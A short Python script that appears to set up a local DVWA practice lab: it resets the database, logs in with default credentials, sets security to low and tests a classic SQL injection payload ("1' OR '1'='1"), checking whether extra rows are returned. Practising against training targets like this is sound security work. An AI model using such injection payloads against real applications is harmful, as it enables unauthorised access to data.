#!/usr/bin/env python3
"""Setup DVWA database"""

import requests

BASE_URL = "http://localhost:8080"

# Get initial session
session = requests.Session()
resp = session.get(f"{BASE_URL}/setup.php")
print(f"Initial session: {session.cookies.get('PHPSESSID')}")

# Create database
resp = session.get(f"{BASE_URL}/setup.php", params={"create_db": ""})
print(f"Create database response: {resp.status_code}")

if "Setup successful" in resp.text or "created" in resp.text.lower():
    print("✓ Database created successfully")
else:
    print("Response content:")
    # Look for success/error messages
    for line in resp.text.split('\n'):
        if 'created' in line.lower() or 'success' in line.lower() or 'error' in line.lower():
            print(f"  {line.strip()[:100]}")

# Login
print("\nLogging in...")
resp = session.post(f"{BASE_URL}/login.php", data={
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
})
print(f"Login response: {resp.status_code}")

# Set security low
resp = session.post(f"{BASE_URL}/security.php", data={
    'security': 'low',
    'seclev_submit': 'Submit'
})
print("Security set to low")

# Test SQLi
print("\nTesting SQL Injection...")
resp = session.get(f"{BASE_URL}/vulnerabilities/sqli/", params={
    'id': '1',
    'Submit': 'Submit'
})

if "First name:" in resp.text:
    print("✓ Normal query works")
    import re
    matches = re.findall(r'First name: (.*?)<br>Surname: (.*?)<br>', resp.text)
    print(f"  Found {len(matches)} results")
    for first, last in matches[:2]:
        print(f"    {first} {last}")
else:
    print("✗ Normal query failed")

# Test SQLi payload
resp = session.get(f"{BASE_URL}/vulnerabilities/sqli/", params={
    'id': "1' OR '1'='1",
    'Submit': 'Submit'
})

if "First name:" in resp.text:
    import re
    matches = re.findall(r'First name: (.*?)<br>Surname: (.*?)<br>', resp.text)
    print(f"\n✓ SQLi payload works! Found {len(matches)} results")
    if len(matches) > 1:
        print("  SQLi CONFIRMED - multiple results returned")
        for i, (first, last) in enumerate(matches[:5]):
            print(f"    {i+1}. {first} {last}")
    else:
        print("  ✗ SQLi failed - only 1 result")
else:
    print("✗ SQLi payload failed")
